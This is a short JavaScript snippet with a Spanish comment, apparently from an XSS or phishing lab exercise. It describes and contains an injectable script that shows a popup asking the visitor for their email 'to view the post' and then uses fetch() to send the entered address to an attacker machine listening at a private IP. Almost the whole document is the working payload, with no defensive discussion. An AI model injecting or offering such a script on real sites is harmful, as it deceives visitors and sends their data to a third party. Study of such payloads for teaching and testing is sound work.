// Este script ejecuta una ventana emergente requiriendo email que es enviado a la máquina atacante a la escucha

```javascript
<script>
	var email = prompt("Pro favor, introduce tu correo electrónico para visualizar el post", "example@example.com");

	if (email == null || email == ""){
		alert("Es necesario introducir un correo válido para visualizar el post");	
	} else {
		fetch("http://192.168.111.45/?email=" + email)
	}
</script>
```
